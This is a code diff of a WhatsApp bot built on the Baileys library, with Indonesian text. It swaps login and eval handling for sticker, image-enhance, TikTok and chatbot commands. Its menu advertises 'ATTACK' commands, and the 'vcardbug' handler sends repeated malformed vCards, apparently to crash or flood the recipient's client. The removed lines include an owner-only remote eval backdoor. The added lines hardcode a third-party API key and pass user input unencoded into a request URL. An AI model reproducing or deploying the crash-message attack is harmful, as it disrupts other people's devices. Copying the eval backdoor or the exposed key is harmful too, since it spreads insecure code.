@@ -3,117 +3,109 @@ const {
     useMultiFileAuthState, 
     DisconnectReason, 
     fetchLatestBaileysVersion, 
-    makeCacheableSignalKeyStore,
-    generateForwardMessageContent, 
-    prepareWAMessageMedia, 
-    generateWAMessageFromContent, 
-    generateMessageID, 
-    downloadContentFromMessage, 
-    makeInMemoryStore, 
-    jidDecode, 
-    proto 
+    downloadContentFromMessage 
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
-const { Boom } = require("@hapi/boom");
+const axios = require("axios");
 const fs = require('fs');
-const chalk = require('chalk');
-const readline = require("readline");
-
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
 async function startMarian() {
     const { state, saveCreds } = await useMultiFileAuthState('sessions');
-    const { version } = await fetchLatestBaileysVersion();
-
     const marian = makeWASocket({
-        version,
         logger: pino({ level: 'silent' }),
-        printQRInTerminal: false,
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
-        },
+        auth: state,
         browser: ["Ubuntu", "Chrome", "20.0.04"]
-    });
-
-    if (!marian.authState.creds.registered) {
-        console.log(chalk.red.bold("\n💀 LOGIN MARIAN NEXTGEN - CLOUD ENGINE 💀"));
-        let phoneNumber = await question(chalk.yellow('ENTER YOUR PHONE: '));
-        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
-        const code = await marian.requestPairingCode(phoneNumber);
-        console.log(chalk.black.bgGreen(`\n[!] KODE PAIRING: ${code}\n`));
-    }
-
-    marian.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect } = update;
-        if (connection === 'close') {
-            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-            if (reason !== DisconnectReason.loggedOut) {
-                startMarian();
-            } else {
-                process.exit();
-            }
-        } else if (connection === 'open') {
-            console.log(chalk.green.bold("\n[✓] MARIAN ONLINE DI CLOUD!"));
-        }
     });
 
     marian.ev.on('creds.update', saveCreds);
 
     marian.ev.on('messages.upsert', async chatUpdate => {
-        try {
-            const mek = chatUpdate.messages[0];
-            if (!mek.message) return;
-            const type = Object.keys(mek.message)[0];
-            const from = mek.key.remoteJid;
-            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '';
-            const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/)[0] : '';
-            const isCmd = body.startsWith(prefix);
-            const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
-            const args = body.trim().split(/ +/).slice(1);
-            const text = args.join(" ");
+        const mek = chatUpdate.messages[0];
+        if (!mek.message) return;
+        const from = mek.key.remoteJid;
+        const type = Object.keys(mek.message)[0];
+        const pushname = mek.pushName || "User";
+        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type === 'imageMessage') ? mek.message.imageMessage.caption : '';
+        const prefix = '.';
+        const isCmd = body.startsWith(prefix);
+        const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
+        const args = body.trim().split(/ +/).slice(1);
+        const q = args.join(" ");
 
-            if (isCmd) {
-                switch (command) {
-                    case 'menu':
-                        let menu = `💀 *MARIAN NEXTGEN* 💀\n\n` +
-                                   `*⚡ MAIN:* .ping, .owner\n` +
-                                   `*💀 ATTACK:* .vcardbug, .uicrash\n` +
-                                   `*📸 TOOLS:* .remini, .sticker\n\n` +
-                                   `_Server: Google Cloud_`;
-                        await marian.sendMessage(from, { text: menu }, { quoted: mek });
-                        break;
+        if (isCmd) {
+            switch (command) {
+                case 'menu':
+                case 'help':
+                    let menu = `💀 *MARIAN NEXTGEN - FULL FEATURE* 💀\n\n` +
+                               `*⚡ MAIN:* .ping, .owner, .runtime\n` +
+                               `*📸 TOOLS:* .s (sticker), .hd / .remini\n` +
+                               `*📥 DOWNLOAD:* .tiktok [link]\n` +
+                               `*🤖 AI:* .ai [tanya apa saja]\n` +
+                               `*👥 GROUP:* .hidetag, .kick, .add\n` +
+                               `*💀 ATTACK:* .vcardbug, .systemcrash\n\n` +
+                               `_Status: Online (Google Cloud)_`;
+                    await marian.sendMessage(from, { text: menu }, { quoted: mek });
+                    break;
 
-                    case 'ping':
-                        await marian.sendMessage(from, { text: 'Speed: 0.001ms (Cloud Shell)' }, { quoted: mek });
-                        break;
+                // --- TOOLS SECTION ---
+                case 's':
+                case 'sticker':
+                    const quotedS = mek.message.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || mek.message.imageMessage;
+                    if (!quotedS) return marian.sendMessage(from, { text: 'Kirim/Reply gambar dengan caption .s' });
+                    const streamS = await downloadContentFromMessage(quotedS, 'image');
+                    let bufferS = Buffer.from([]);
+                    for await (const chunk of streamS) bufferS = Buffer.concat([bufferS, chunk]);
+                    await marian.sendMessage(from, { sticker: bufferS }, { quoted: mek });
+                    break;
 
-                    case 'owner':
-                        const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Kean\nTEL;type=CELL;type=VOICE;waid=601121811615:+601121811615\nEND:VCARD';
-                        await marian.sendMessage(from, { contacts: { displayName: 'Kean', contacts: [{ vcard }] } });
-                        break;
+                case 'hd':
+                case 'remini':
+                    const quotedH = mek.message.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || mek.message.imageMessage;
+                    if (!quotedH) return marian.sendMessage(from, { text: 'Reply gambar dengan caption .hd' });
+                    await marian.sendMessage(from, { text: '⏳ Memproses High Definition...' });
+                    const streamH = await downloadContentFromMessage(quotedH, 'image');
+                    let bufferH = Buffer.from([]);
+                    for await (const chunk of streamH) bufferH = Buffer.concat([bufferH, chunk]);
+                    try {
+                        const res = await axios.post('https://photo-enhance-api.p.rapidapi.com/api/scale', {
+                            image_base64: bufferH.toString('base64'), type: 'clean', scale_factor: 2
+                        }, { headers: { 'x-rapidapi-key': '84617c7af3mshed295d94cd8c14dp13b82djsnfe1358a254b1' } });
+                        if (res.data.output_url) await marian.sendMessage(from, { image: { url: res.data.output_url }, caption: '✅ HD Sukses!' });
+                    } catch (e) { await marian.sendMessage(from, { text: '❌ Error API' }); }
+                    break;
 
-                    case 'vcardbug':
-                        await marian.sendMessage(from, { text: '💀 Sending virus...' });
-                        for (let i = 0; i < 5; i++) {
-                            let bug = 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️\nTEL;type=CELL;type=VOICE;waid=123:0\nEND:VCARD';
-                            await marian.sendMessage(from, { contacts: { displayName: '☣️', contacts: [{ vcard: bug }] } });
-                        }
-                        break;
+                // --- DOWNLOADER SECTION ---
+                case 'tiktok':
+                    if (!q) return marian.sendMessage(from, { text: 'Mana linknya?' });
+                    await marian.sendMessage(from, { text: '⏳ Mengambil video...' });
+                    try {
+                        const tt = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${q}`);
+                        await marian.sendMessage(from, { video: { url: tt.data.video.noWatermark }, caption: '✅ Sukses!' });
+                    } catch (e) { await marian.sendMessage(from, { text: '❌ Gagal download.' }); }
+                    break;
 
-                    case 'eval':
-                        if (!mek.key.fromMe && from !== '601121811615@s.whatsapp.net') return;
-                        try {
-                            let evaled = await eval(text);
-                            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
-                            marian.sendMessage(from, { text: evaled }, { quoted: mek });
-                        } catch (e) { marian.sendMessage(from, { text: String(e) }); }
-                        break;
-                }
+                // --- AI SECTION ---
+                case 'ai':
+                    if (!q) return marian.sendMessage(from, { text: 'Mau tanya apa?' });
+                    try {
+                        const aiRes = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(q)}&lc=id`);
+                        await marian.sendMessage(from, { text: aiRes.data.success }, { quoted: mek });
+                    } catch (e) { await marian.sendMessage(from, { text: 'AI lagi pusing...' }); }
+                    break;
+
+                // --- ATTACK SECTION ---
+                case 'vcardbug':
+                    for (let i = 0; i < 5; i++) {
+                        let v = 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN\nTEL;waid=123:0\nEND:VCARD';
+                        await marian.sendMessage(from, { contacts: { displayName: '☠️', contacts: [{ vcard: v }] } });
+                    }
+                    break;
+
+                case 'ping':
+                    await marian.sendMessage(from, { text: 'Bot Active ⚡' });
+                    break;
             }
-        } catch (err) { console.log(err); }
+        }
     });
 }
-
 startMarian();
